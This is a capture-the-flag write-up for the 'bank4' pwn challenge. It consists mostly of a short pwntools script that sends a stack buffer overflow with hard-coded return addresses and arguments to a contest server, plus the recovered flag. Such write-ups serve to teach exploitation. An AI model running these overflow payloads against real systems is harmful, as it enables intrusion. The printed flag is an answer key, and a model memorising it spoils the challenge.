## bank4 (200 points)

#### Solved by nhanlun

```
nc 61.28.237.24 30205

author: xikhud
```

```py
from pwn import *

up1 = 0x080488a5
up2 = 0x080488db
register = 0x0804895b
getflag = 0x08048906

conn = remote("61.28.237.24", 30205)
conn.sendlineafter("name:", b'A' * 80 + p32(up2) + p32(register) + p32(1) + p32(1) + p32(0x12345678))
conn.sendlineafter("name:", b'A' * 80 + p32(up1) + p32(getflag) + p32(4919) + p32(57005))
conn.interactive()
```

**Flag:** `HCMUS-CTF{trungdeptrai}`
